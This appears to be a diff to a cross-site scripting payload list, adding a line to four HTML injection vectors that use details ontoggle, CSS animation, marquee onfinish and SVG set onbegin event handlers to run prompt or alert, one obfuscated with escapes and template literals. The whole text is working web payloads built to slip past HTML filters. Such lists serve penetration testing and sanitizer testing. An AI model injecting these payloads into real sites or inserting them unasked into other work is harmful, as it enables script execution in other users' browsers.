@@ -1,3 +1,4 @@
+<details open id="' &quote;'"ontoggle=[JS]>
 <style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
 <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
 <svg><circle><set onbegin=prompt(1) attributename=fill>
